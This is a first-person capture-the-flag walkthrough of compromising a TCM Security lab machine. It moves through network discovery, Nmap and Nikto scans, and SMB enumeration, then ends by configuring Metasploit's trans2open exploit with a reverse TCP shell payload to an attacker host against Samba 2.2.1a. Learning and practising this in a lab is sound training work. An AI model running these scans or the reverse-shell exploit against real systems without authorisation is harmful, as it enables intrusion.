# TCM Security - First Machine Hack Walkthrough

## 🧠 Summary

This walkthrough documents my approach to compromising a beginner-level Capture The Flag (CTF) machine from TCM Security. The goal was to simulate a real-world penetration test by enumerating services, identifying vulnerabilities, and exploiting them to gain access. This exercise helped reinforce my understanding of tools like Nmap, Nikto, SMB enumeration, and Metasploit. All steps are presented in order, with supporting screenshots, to guide others through the same learning process.

---

## 🔍 **Step 1: Discovering the Target**

I started by identifying machines on the local network using `netdiscover`.
![image](https://github.com/user-attachments/assets/1b7d3b51-ba12-4c02-af78-6d77f25febc7)



netdiscover -r 192.xxx.xx.x/24

This showed me the IP address of the machine I wanted to target. Once I had that, I moved on to port scanning.

## ⚡ Step 2: Port Scanning with Nmap

Next, I ran a full TCP port scan using Nmap to find all open ports and grab service/version info.

![Nmap Scan](https://github.com/user-attachments/assets/fbd66e99-eb3b-450a-8d47-e53893026566)



nmap -T4 -p- -A 192.168.1.193
-T4: faster timing

-p-: scans all 65535 ports

-A: aggressive mode (includes OS detection, version info, script scan, traceroute)

The scan revealed open ports including HTTP and SMB services.

## 🌐 **Step 3: Web Enumeration**
Since port 80 was open, I navigated to the web server and began enumerating.

Nikto Web Scanner
I used Nikto to scan for common web vulnerabilities:
![image](https://github.com/user-attachments/assets/496b5212-c643-4d16-ac28-fcc34256ba8f)


nikto -h http://192.168.x.xxx
This flagged possible remote buffer overflows and code execution vulnerabilities.

DirBuster Directory Discovery
I then ran DirBuster to brute-force hidden directories and file extensions:


dirbuster &
I added extensions like .pdf, .zip, and .rar to catch more files. While DirBuster ran, I manually reviewed the page source and found a 404 page that disclosed the Apache version — a small but useful info leak.
![image](https://github.com/user-attachments/assets/09bdaab1-3935-4951-b556-ef7d3b00fffe)



## 🔧 Step 4: SMB Enumeration
Back to the Nmap scan — I noticed SMB was running and decided to investigate further.

Using Metasploit to Identify SMB Version
I launched Metasploit and searched for SMB-related modules:

search smb
Then I used the SMB version scanner module:


use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.x.xxx

run
This revealed that the target was running Samba 2.2.1a, which is vulnerable.

Connecting with SMBClient
I attempted to connect to the file share using:
![image](https://github.com/user-attachments/assets/12a1ab35-a8c0-46bb-8113-6d8996ea8575)


smbclient //192.168.x.xxx/IPC$ -N
Anonymous login worked for IPC$, though I couldn’t access admin$.

📚 Step 5: Finding Exploits
With the Samba version identified, I searched Exploit-DB and found a known vulnerability that matched. I also found a Metasploit module on Rapid7’s site that could be used to exploit Samba 2.2.1a.

## 🚪 Step 6: Exploiting Samba with a Reverse Shell

After identifying that the target was running **Samba 2.2.x**, I searched for relevant Metasploit modules. I found the `trans2open` exploit and configured it with a **non-staged reverse TCP shell payload** (`linux/x86/shell_reverse_tcp`), which is simple and direct.

### Payload Settings:
- **LHOST**: `192.168.xx.xxx`
- **LPORT**: `4444`
- **CMD**: `/bin/sh`

Here’s what the payload configuration looked like:


set payload linux/x86/shell_reverse_tcp
set LHOST 192.168.57.139
set LPORT 4444
run

![image](https://github.com/user-attachments/assets/6f2ccb85-89e4-4f71-a18a-4e6ce24cec97)


I read through the exploit details and prepped the payload in Metasploit for potential use.

🛠 Tools I Used
-netdiscover

-nmap

-nikto

-dirbuster

-burpsuite

-metasploit

-smbclient

🎯 Conclusion
This machine helped me understand:

How to enumerate live hosts and open services

When and how to use aggressive Nmap scanning

Web-based reconnaissance using Nikto and DirBuster

SMB service enumeration and exploitation research

It was a great introduction to real-world penetration testing, and it showed me how powerful a combination of tools and research can be.

